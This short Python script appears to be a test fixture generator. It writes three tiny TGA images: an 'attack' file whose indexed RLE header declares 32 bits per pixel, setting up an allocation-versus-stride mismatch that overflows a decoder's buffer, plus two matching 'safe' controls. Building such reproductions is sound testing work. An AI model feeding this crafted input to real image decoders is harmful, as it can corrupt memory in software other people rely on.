#!/usr/bin/env python3
"""Three local TGA inputs; each file is exactly 28 bytes.

attack:  indexed RLE (type 9), bpp=32 -> 1-byte/pixel allocation, 4-byte stride.
safe8:   indexed RLE (type 9), bpp=8  -> matching 1-byte stride, 6 trailing
         padding bytes left unread after the two RLE packets.
safe32:  truecolor RLE (type 10), bpp=32 -> matching 4-byte stride.
"""
import struct
import sys

out = sys.argv[1]


def header(image_type, bpp):
    hdr = bytes([0, 0, image_type]) + struct.pack("<HHB", 0, 0, 0)
    hdr += struct.pack("<HH", 0, 0) + struct.pack("<HH", 16, 16)
    return hdr + bytes([bpp, 0])


def write(name, image_type, bpp, body):
    with open(f"{out}/{name}.tga", "wb") as f:
        f.write(header(image_type, bpp) + body)


write("attack", 9, 32, (bytes([0xFF]) + b"\xAA\xBB\xCC\xDD") * 2)
write("safe8", 9, 8, (bytes([0xFF, 0xAA])) * 2 + b"\x00" * 6)
write("safe32", 10, 32, (bytes([0xFF]) + b"\xAA\xBB\xCC\xDD") * 2)
